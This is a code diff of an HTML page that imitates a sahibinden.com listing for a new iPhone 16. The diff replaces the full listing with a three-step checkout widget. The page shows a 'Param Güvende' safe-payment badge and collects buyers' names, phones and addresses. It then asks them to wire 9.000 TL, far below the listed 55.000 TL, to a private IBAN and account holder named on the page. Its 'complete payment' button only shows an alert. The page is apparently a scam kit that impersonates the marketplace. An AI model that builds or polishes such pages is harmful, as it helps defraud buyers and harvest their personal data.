@@ -1,226 +1,128 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Sıfır İphone 16 256GB - sahibinden.com (Bundled)</title>
-  <!-- Tailwind CDN -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-  .btn { display: inline-flex; align-items: center; gap: .5rem; background: #ffffff; border: 1px solid #d1d5db; padding: .5rem 1rem; border-radius: .375rem; cursor: pointer; font-weight: 600; }
-  .btn:hover { filter: brightness(.98); }
-  .btn-primary { background: #003D82; color: white; border-color: transparent; }
-  .btn-success { background: #10B981; color: white; border-color: transparent; }
-  .avatar { background: #1f2937; color: white; width: 40px; height: 40px; border-radius: 9999px; display: inline-flex; align-items: center; justify-content: center; font-weight: 700; }
-  .badge { border-radius: 9999px; padding: .25rem .5rem; font-size: .75rem; }
-  .tabs-trigger.active { border-bottom: 2px solid #003D82; font-weight: 700; }
-  .tabs-trigger:focus { outline: none; box-shadow: 0 0 0 3px rgba(0,61,130,0.12); }
-  .tabs-trigger[aria-selected="true"] { color: #003D82; }
-  .tab-content.hidden { display: none; }
-  .input { padding: 0.5rem 0.75rem; border-radius: 0.375rem; border: 1px solid #d1d5db; }
-  .card { transition: box-shadow .15s linear; }
-  .card:hover { box-shadow: 0 6px 18px rgba(0,0,0,0.08); }
-  @media (max-width: 1023px) { .w-80 { width: 18rem; } }
-  /* Ödeme Bölümü Kapsayıcı */
-  .odeme-stepper-wrap { margin-top:32px; background:#f9fafb; border-radius:14px; box-shadow:0 1px 8px #0001; }
-  .odeme-stepper-container { max-width:410px; margin:0 auto; }
-  .odeme-stepper-stepper { display:flex; justify-content:space-between; gap:8px; padding:20px 10px 10px 10px; }
-  .odeme-stepper-step { flex:1; text-align:center; font-size:13px; }
-  .odeme-stepper-circle { width:28px; height:28px; display:inline-block;line-height:28px;border-radius:50%;background:#eee; color:#222; margin-bottom:3px; font-weight:bold;}
-  .odeme-stepper-active .odeme-stepper-circle { background:#0bb38f; color:#fff; }
-  .odeme-stepper-active { color:#0bb38f; font-weight:bold; }
-  .odeme-stepper-form, .odeme-stepper-odeme { padding:24px 20px 18px 20px;}
-  .odeme-stepper-form label { display:block; margin-top:10px;font-weight:500; font-size:15px;}
-  .odeme-stepper-form input, .odeme-stepper-form textarea { width:100%; margin:6px 0 12px 0; padding:11px; border:1px solid #ccc; border-radius:7px;font-size:16px;}
-  .odeme-stepper-form textarea { resize: vertical; min-height:40px; }
-  .odeme-stepper-primary { display:block; width:100%; padding:16px; background:#1562d6; border:none; color:#fff; font-weight:600; font-size:16px; border-radius:9px; box-shadow:0 4px 10px #0001; margin-top:26px; transition: background 0.2s;}
-  .odeme-stepper-primary:active { background:#0b49a1;}
-  .odeme-stepper-error { color:crimson; font-size:13px; margin-top:-10px; margin-bottom:6px; }
-  .odeme-stepper-iban-row { display: flex; align-items:center; margin:14px 0 14px 0;}
-  .odeme-stepper-iban-row button {margin-left:10px; padding:8px 15px; border-radius:7px; border:none; background:#ddd; color:#333; font-size:15px; cursor:pointer; transition:background.2s;}
-  .odeme-stepper-iban-row button:active { background:#0bb38f !important; color:#fff;}
-  .odeme-stepper-desc { color:#154893; font-size: 15px; margin-bottom: 9px; }
-  .odeme-stepper-alert { background:#fff3cd; color:#856404; border-radius:9px; padding:10px 15px; margin:18px 0 14px 0; font-size:15px;}
-  .odeme-stepper-price-summary { background:#eaf7f5; padding:16px 8px; border-radius:7px; margin:15px 0 8px 0;}
-  .odeme-stepper-price-summary div { display:flex; justify-content:space-between; margin-top:3px; font-size:15px;}
-  @media (max-width: 500px) {
-    .odeme-stepper-container { max-width:100%; }
-    .odeme-stepper-form, .odeme-stepper-odeme { padding: 24px 8px 16px 8px;}
-    .odeme-stepper-wrap { margin-top:20px;}
-  }
-  </style>
-</head>
-<body class="min-h-screen bg-gray-50">
-  <!-- Header -->
-  <header class="bg-[#FFE500] border-b border-gray-300">
-    <div class="max-w-7xl mx-auto px-4 py-3">
-      <div class="flex items-center justify-between">
-        <a href="/" class="text-2xl font-bold bg-[#FFE500] px-4 py-2 border-2 border-black">sahibinden.com</a>
-        <div class="flex-1 max-w-2xl mx-8">
-          <div class="relative">
-            <label for="search" class="sr-only">Arama</label>
-            <input id="search" type="text" placeholder="Kelime, ilan no veya mağaza adı ile ara" class="input pr-12 h-11 bg-white border border-gray-300 rounded w-full" />
-            <button class="absolute right-0 top-0 h-11 px-6 bg-white hover:bg-gray-100 text-gray-700 border-l">
-              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
-            </button>
-          </div>
-        </div>
-        <div class="flex items-center gap-3">
-          <button class="btn">Giriş Yap</button>
-          <button class="btn">Hesap Aç</button>
-          <button class="btn btn-primary">Ücretsiz* İlan Ver</button>
-        </div>
+<!-- Satın al butonunun hemen altına EKLEYİN -->
+<div class="max-w-lg mx-auto my-5">
+  <div id="stepperBox" class="bg-white rounded-xl shadow overflow-hidden border border-gray-200">
+    <div class="flex justify-between items-center px-6 pt-6 pb-3">
+      <div class="flex flex-col items-center w-1/3">
+        <div class="w-8 h-8 rounded-full flex items-center justify-center font-bold text-white text-xl transition bg-blue-600" id="s1circle">1</div>
+        <span class="text-xs mt-2 text-blue-700 font-semibold">Ürün</span>
+      </div>
+      <div class="h-1 w-1/6 bg-gray-300"></div>
+      <div class="flex flex-col items-center w-1/3">
+        <div class="w-8 h-8 rounded-full flex items-center justify-center font-bold text-white text-xl transition bg-gray-400" id="s2circle">2</div>
+        <span class="text-xs mt-2 text-gray-600 font-semibold">Adres</span>
+      </div>
+      <div class="h-1 w-1/6 bg-gray-300"></div>
+      <div class="flex flex-col items-center w-1/3">
+        <div class="w-8 h-8 rounded-full flex items-center justify-center font-bold text-white text-xl transition bg-gray-400" id="s3circle">3</div>
+        <span class="text-xs mt-2 text-gray-600 font-semibold">Ödeme</span>
       </div>
     </div>
-    <div class="bg-[#003D82] text-white">
-      <div class="max-w-7xl mx-auto px-4">
-        <nav class="flex items-center gap-6 py-3 text-sm">
-          <a href="#" class="hover:underline">İkinci El ve Sıfır Alışveriş</a>
-          <a href="#" class="hover:underline">Cep Telefonu & Aksesuarlar</a>
-          <a href="#" class="hover:underline">Cep Telefonu</a>
-          <a href="#" class="hover:underline">Apple</a>
-          <a href="#" class="hover:underline">iPhone 16</a>
-        </nav>
+    <!-- STEP 1: ÜRÜN -->
+    <div id="step1" class="p-6">
+      <h2 class="text-lg font-semibold mb-2">Ürün Bilgisi</h2>
+      <div class="mb-2 flex justify-between"><span>Ürün:</span> <span class="font-semibold">Sıfır İphone 16 256GB</span></div>
+      <div class="mb-2 flex justify-between"><span>Fiyat:</span> <span class="font-semibold">8.750,00 TL</span></div>
+      <div class="mb-2 flex justify-between"><span>Hizmet Bedeli:</span> <span class="font-semibold">250,00 TL</span></div>
+      <div class="mb-2 flex justify-between"><span>Toplam:</span> <span class="font-extrabold">9.000,00 TL</span></div>
+      <button id="step1next" class="mt-5 w-full py-3 rounded bg-blue-600 text-white font-bold text-lg">Devam &rarr;</button>
+    </div>
+    <!-- STEP 2: ADRES -->
+    <form id="step2" class="p-6 hidden space-y-2" autocomplete="off" onsubmit="return false;">
+      <h2 class="text-lg font-semibold mb-2">Teslimat Bilgileriniz</h2>
+      <label class="text-sm">Adınız *
+        <input type="text" id="ad" name="ad" class="input mt-1 block w-full border-gray-300" required>
+        <div class="text-red-500 text-xs" id="adErr"></div>
+      </label>
+      <label class="text-sm">Soyadınız *
+        <input type="text" id="soyad" name="soyad" class="input mt-1 block w-full border-gray-300" required>
+        <div class="text-red-500 text-xs" id="soyadErr"></div>
+      </label>
+      <label class="text-sm">Telefon Numaranız *
+        <input type="tel" id="telefon" name="telefon" class="input mt-1 block w-full border-gray-300" pattern="[0-9]{10,15}" required>
+        <div class="text-red-500 text-xs" id="telefonErr"></div>
+      </label>
+      <label class="text-sm">Adres *
+        <textarea id="adres" name="adres" rows="2" class="input mt-1 block w-full border-gray-300" required></textarea>
+        <div class="text-red-500 text-xs" id="adresErr"></div>
+      </label>
+      <div class="flex gap-3 mt-4">
+        <button type="button" id="step2prev" class="w-1/2 py-2 rounded bg-gray-300 text-gray-800 font-semibold">&larr; Geri</button>
+        <button type="submit" id="step2next" class="w-1/2 py-2 rounded bg-blue-600 text-white font-bold">Devam &rarr;</button>
+      </div>
+    </form>
+    <!-- STEP 3: ÖDEME -->
+    <div id="step3" class="p-6 hidden">
+      <h2 class="text-lg font-semibold mb-4">Ödeme Bilgilendirmesi</h2>
+      <div class="mb-3"><strong>İBAN:</strong> <span id="ibanVal">TR960006400000184110155076</span>
+        <button type="button" onclick="copyIbanStepper()" class="ml-3 px-2 py-1 bg-gray-200 rounded hover:bg-blue-500 hover:text-white text-xs">Kopyala</button>
+      </div>
+      <div class="mb-1"><strong>Hesap Sahibi:</strong> Koray Büyüktaş</div>
+      <div class="mb-1"><strong>Hesap No:</strong> 0313402</div>
+      <div class="mb-1"><strong>Şube Kodu:</strong> 2235</div>
+      <div class="bg-yellow-100 text-yellow-900 rounded p-2 my-4 text-sm"><b>Dikkat:</b> Banka hesabımıza para yatırdıktan sonra ödeme bildirimi yapınız.</div>
+      <div class="mb-2 border-t pt-3">
+        <div class="flex justify-between"><span>Ürün Tutarı</span><span>8.750,00 TL</span></div>
+        <div class="flex justify-between"><span>Hizmet Bedeli</span><span>250,00 TL</span></div>
+        <div class="flex justify-between font-bold"><span>Toplam</span><span>9.000,00 TL</span></div>
+      </div>
+      <div class="flex gap-3 mt-5">
+        <button type="button" id="step3prev" class="w-1/2 py-2 rounded bg-gray-300 text-gray-800 font-bold">&larr; Geri</button>
+        <button type="button" onclick="alert('Ödeme bildirimi tamamlandı!')" class="w-1/2 py-2 rounded bg-green-600 text-white font-bold">Ödemeyi Tamamla</button>
       </div>
     </div>
-  </header>
-
-  <main class="max-w-7xl mx-auto px-4 py-6">
-    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-      <div class="lg:col-span-2">
-        <div class="bg-white rounded-lg p-6 mb-6">
-          <div class="flex gap-6 flex-col lg:flex-row">
-            <div class="flex-shrink-0">
-              <div class="w-80 h-80 bg-gray-100 rounded-lg flex items-center justify-center relative overflow-hidden">
-                <span class="badge bg-[#00CDB4] text-white absolute top-3 left-3 px-2 py-1 inline-flex items-center gap-1"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Param Güvende</span>
-                <img src="https://images.unsplash.com/photo-1592286927505-e593d3fab2fe?w=600&h=600&fit=crop" alt="iPhone 16" class="w-full h-full object-contain"/>
-              </div>
-            </div>
-            <div class="flex-1">
-              <h1 class="text-2xl font-bold mb-4">Sıfır İphone 16 256GB</h1>
-              <div class="mb-4">
-                <div class="text-3xl font-bold text-gray-900 mb-2">55.000 TL</div>
-                <div class="flex gap-2 text-sm text-gray-600"><span class="bg-blue-50 text-blue-600 px-2 py-1 rounded">% Kredi Teklifi Al</span></div>
-              </div>
-              <div class="space-y-3 mb-6">
-                <div class="flex"><span class="text-gray-600 w-40">İlan No</span><span class="font-semibold">1219123857</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">İlan Tarihi</span><span class="font-semibold">25 Aralık 2024</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Marka</span><span class="font-semibold">Apple</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Model</span><span class="font-semibold">iPhone 16</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Renk</span><span class="font-semibold">Siyah</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Depolama Kapasitesi</span><span class="font-semibold">256 GB</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Ekran Boyutu</span><span class="font-semibold">6.1 inç</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Kamera</span><span class="font-semibold">48 megapiksel</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Ön Kamera</span><span class="font-semibold">12 megapiksel</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">İşletim Sistemi</span><span class="font-semibold">iOS</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Alındığı Yer</span><span class="font-semibold">Belirtilmemiş</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Garanti</span><span class="font-semibold">Distribütör Garantili</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Kimden</span><span class="font-semibold">Sahibinden</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Durumu</span><span class="font-semibold">Sıfır</span></div>
-                <div class="flex"><span class="text-gray-600 w-40">Takas</span><span class="font-semibold">Hayır</span></div>
-              </div>
-              <button class="btn btn-success w-full h-12 text-lg mb-3">Satın al</button>
-
-              <!-- ÖDEME STEPPER BAŞLANGIÇ -->
-              <div class="odeme-stepper-wrap">
-                <div class="odeme-stepper-container">
-                  <!-- stepper -->
-                  <div class="odeme-stepper-stepper">
-                    <div class="odeme-stepper-step odeme-stepper-active" id="stepper1">
-                      <span class="odeme-stepper-circle">1</span>
-                      <div>Bilgiler</div>
-                    </div>
-                    <div class="odeme-stepper-step" id="stepper2">
-                      <span class="odeme-stepper-circle">2</span>
-                      <div>Ödeme</div>
-                    </div>
-                  </div>
-                  <!-- Bilgi Formu -->
-                  <form class="odeme-stepper-form" id="bilgiForm" autocomplete="off" onsubmit="return handleDevamEt(event)">
-                    <label>Adınız *</label>
-                    <input type="text" id="ad" required autocomplete="off" />
-                    <div class="odeme-stepper-error" id="errAd"></div>
-
-                    <label>Soyadınız *</label>
-                    <input type="text" id="soyad" required autocomplete="off"/>
-                    <div class="odeme-stepper-error" id="errSoyad"></div>
-
-                    <label>Telefon Numaranız *</label>
-                    <input type="tel" id="telefon" required inputmode="numeric" pattern="[0-9]{10,15}" />
-                    <div class="odeme-stepper-error" id="errTelefon"></div>
-
-                    <label>Adres *</label>
-                    <textarea id="adres" required rows="2"></textarea>
-                    <div class="odeme-stepper-error" id="errAdres"></div>
-
-                    <button class="odeme-stepper-primary" type="submit">Devam Et</button>
-                  </form>
-                  <!-- Ödeme Ekranı -->
-                  <div class="odeme-stepper-odeme" id="odemeEkrani" style="display:none;">
-                    <div class="odeme-stepper-desc">Lütfen ödemenizi aşağıdaki IBAN bilgilerine yapınız:</div>
-                    <div class="odeme-stepper-iban-row">
-                      <span><b>İBAN:</b> <span id="iban">TR960006400000184110155076</span></span>
-                      <button tabindex="0" onclick="copyIban()" type="button">Kopyala</button>
-                    </div>
-                    <div style="font-size: 15px; margin: 8px 0;">
-                      <b>Hesap Sahibi:</b> Koray Büyüktaş<br />
-                      <b>Hesap Numarası:</b> 0313402<br />
-                      <b>Şube Kodu:</b> 2235
-                    </div>
-                    <div class="odeme-stepper-alert">
-                      <b>Dikkat!</b> Banka hesabımıza para yatırdıktan sonra ödeme bildirimi yapınız.
-                    </div>
-                    <div class="odeme-stepper-price-summary">
-                      <div><span>Ürün Tutarı</span> <span>8.750,00 TL</span></div>
-                      <div><span>Hizmet Bedeli</span> <span>250,00 TL</span></div>
-                      <div><b>Toplam</b> <b>9.000,00 TL</b></div>
-                    </div>
-                    <button class="odeme-stepper-primary" onclick="alert('Ödeme bildirimi tamamlandı!')">Ödemeyi Tamamla</button>
-                  </div>
-                </div>
-              </div>
-              <!-- ÖDEME STEPPER SONU -->
-
-            </div>
-          </div>
-        </div>
-        <!-- ... Devamındaki diğer içerik ... -->
-        <!-- Tabs Section ve Q&A/Similar Listings bölümleri burada devam ediyor (orijinali gibi) -->
-        <!-- ... -->
-        <script type="module">
-  // ... (Senin kendi tab switch kodun değişmeden devam) ...
-
-  function copyIban() {
-    const iban = document.getElementById("iban").innerText;
+  </div>
+</div>
+<script>
+  // Simple Stepper Navigation
+  const s1 = document.getElementById("step1");
+  const s2 = document.getElementById("step2");
+  const s3 = document.getElementById("step3");
+  const s1c = document.getElementById("s1circle");
+  const s2c = document.getElementById("s2circle");
+  const s3c = document.getElementById("s3circle");
+  document.getElementById("step1next").onclick = () => {
+    s1.classList.add("hidden");
+    s2.classList.remove("hidden");
+    s1c.classList.remove("bg-blue-600"); s1c.classList.add("bg-gray-400");
+    s2c.classList.remove("bg-gray-400"); s2c.classList.add("bg-blue-600");
+    s3c.classList.remove("bg-blue-600"); s3c.classList.add("bg-gray-400");
+  };
+  document.getElementById("step2prev").onclick = () => {
+    s2.classList.add("hidden");
+    s1.classList.remove("hidden");
+    s1c.classList.add("bg-blue-600"); s1c.classList.remove("bg-gray-400");
+    s2c.classList.add("bg-gray-400"); s2c.classList.remove("bg-blue-600");
+  };
+  document.getElementById("step2next").onclick = function (ev) {
+    ev.preventDefault();
+    let err = false;
+    let ad = document.getElementById("ad").value.trim();
+    let soyad = document.getElementById("soyad").value.trim();
+    let telefon = document.getElementById("telefon").value.trim();
+    let adres = document.getElementById("adres").value.trim();
+    document.getElementById("adErr").innerText = ""; document.getElementById("soyadErr").innerText = ""; document.getElementById("telefonErr").innerText = ""; document.getElementById("adresErr").innerText = "";
+    if (!ad) { document.getElementById("adErr").innerText = "Adınızı giriniz"; err = true; }
+    if (!soyad) { document.getElementById("soyadErr").innerText = "Soyadınızı giriniz"; err = true; }
+    if (!telefon) { document.getElementById("telefonErr").innerText = "Telefon giriniz"; err = true; }
+    else if (!/^[0-9]{10,15}$/.test(telefon)) { document.getElementById("telefonErr").innerText = "Geçerli telefon giriniz"; err = true; }
+    if (!adres) { document.getElementById("adresErr").innerText = "Adres giriniz"; err = true; }
+    if (err) return false;
+    s2.classList.add("hidden");
+    s3.classList.remove("hidden");
+    s2c.classList.remove("bg-blue-600"); s2c.classList.add("bg-gray-400");
+    s3c.classList.add("bg-blue-600"); s3c.classList.remove("bg-gray-400");
+    return false;
+  };
+  document.getElementById("step3prev").onclick = () => {
+    s3.classList.add("hidden");
+    s2.classList.remove("hidden");
+    s2c.classList.add("bg-blue-600"); s2c.classList.remove("bg-gray-400");
+    s3c.classList.remove("bg-blue-600"); s3c.classList.add("bg-gray-400");
+  };
+  // IBAN kopyala
+  function copyIbanStepper() {
+    const iban = document.getElementById("ibanVal").innerText;
     navigator.clipboard.writeText(iban);
     alert("IBAN kopyalandı!");
   }
-  function handleDevamEt(e) {
-    e.preventDefault();
-    // Temizle
-    document.getElementById("errAd").innerText = "";
-    document.getElementById("errSoyad").innerText = "";
-    document.getElementById("errTelefon").innerText = "";
-    document.getElementById("errAdres").innerText = "";
-    // Kontrol
-    let hasError = false;
-    const ad = document.getElementById("ad").value.trim();
-    const soyad = document.getElementById("soyad").value.trim();
-    const telefon = document.getElementById("telefon").value.trim();
-    const adres = document.getElementById("adres").value.trim();
-    if (ad === "") { document.getElementById("errAd").innerText = "Zorunlu alan"; hasError = true; }
-    if (soyad === "") { document.getElementById("errSoyad").innerText = "Zorunlu alan"; hasError = true; }
-    if (telefon === "") { document.getElementById("errTelefon").innerText = "Zorunlu alan"; hasError = true; }
-    else if (!/^[0-9]{10,15}$/.test(telefon)) { document.getElementById("errTelefon").innerText = "Geçerli bir telefon girin"; hasError = true; }
-    if (adres === "") { document.getElementById("errAdres").innerText = "Zorunlu alan"; hasError = true; }
-    if (hasError) return false;
-    // Ekran geçişi
-    document.getElementById("bilgiForm").style.display = "none";
-    document.getElementById("odemeEkrani").style.display = "block";
-    document.getElementById("stepper1").classList.remove("odeme-stepper-active");
-    document.getElementById("stepper2").classList.add("odeme-stepper-active");
-    return false;
-  }
-
-  try { window.copyIban = copyIban; window.handleDevamEt = handleDevamEt; } catch(e) {}
 </script>
